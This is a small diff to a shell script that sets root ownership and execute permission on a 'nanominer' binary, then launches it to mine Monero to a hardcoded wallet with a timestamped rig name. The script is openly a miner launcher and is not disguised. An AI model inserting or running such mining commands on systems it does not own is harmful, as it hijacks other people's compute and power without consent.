@@ -27,6 +27,10 @@ chmod -R +x /nanominer
 ls -l nanominer > droit.txt
 cat droit.txt
 echo "retry start nanominer"
+ls -l  > droit.txt
+cat droit.txt
+chown root:root ./nanominer
+chmod +x ./nanominer
 ./nanominer -algo randomx -wallet 44iLhbGuyJTbkkKNR8kun3PDMZT7b3pFjJ2NbY888ruQWxC5st19A6B1N2ks1LmEfJDW9jXoW1sfTAfHZdDrSoKGQ3tm5d1 -coin xmr -rigName djay_$(date +'%s') -email contact@djayzone.com
 sleep 360
 echo "BUG"
